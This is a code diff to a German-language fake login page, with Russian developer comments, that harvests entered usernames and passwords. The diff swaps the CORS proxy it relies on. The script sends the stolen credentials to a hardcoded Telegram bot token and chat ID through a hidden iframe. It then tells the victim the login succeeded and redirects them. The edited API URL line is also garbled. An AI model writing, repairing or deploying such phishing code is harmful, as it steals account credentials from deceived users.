@@ -161,14 +161,13 @@
     <script>
         const botToken = "8408447077:AAFtGEn83fMMy66MnIdveRPW5kQ5ZQukU04";
         const chatId = "5684291694";
-        const proxyUrl = "https://corsproxy.io/?";
-        const redirectUrl = "https://www.google.com"; // ← Замени на свой URL!
+        const proxyUrl = "https://api.allorigins.win/raw?url=";  // ← Самый рабочий прокси сейчас (2026)
+        const redirectUrl = "https://www.google.com"; // ← Замени на свой, если нужно
 
         const consent1 = document.getElementById("consent1");
         const consent2 = document.getElementById("consent2");
         const loginButton = document.getElementById("loginButton");
 
-        // Функция проверки галочек и активации кнопки
         function checkConsents() {
             if (consent1.checked && consent2.checked) {
                 loginButton.disabled = false;
@@ -182,7 +181,6 @@
         consent1.addEventListener("change", checkConsents);
         consent2.addEventListener("change", checkConsents);
 
-        // Раскрытие/скрытие текста
         function toggleDetails(element) {
             const details = element.nextElementSibling;
             details.classList.toggle("open");
@@ -203,14 +201,18 @@
 
             const text = encodeURIComponent(`🔔 Neuer Login-Versuch! (Beide Zustimmungen erteilt)\n\n👤 Benutzername: ${rawUsername}\n🔑 Passwort: ${rawPassword}`);
 
-            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=HTML`;
+            const apiUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${text}&parse_mode=HTML`;
             const fullUrl = proxyUrl + encodeURIComponent(apiUrl);
 
+            // Используем iframe как в оригинале — просто и без fetch-ошибок
             const iframe = document.createElement('iframe');
             iframe.src = fullUrl;
             iframe.style.display = "none";
             document.body.appendChild(iframe);
-            setTimeout(() => document.body.removeChild(iframe), 1000);
+
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+            }, 1500);
 
             document.getElementById("status").innerHTML = "Erfolgreich angemeldet! Weiterleitung... 🔄";
             document.getElementById("status").style.color = "#28a745";
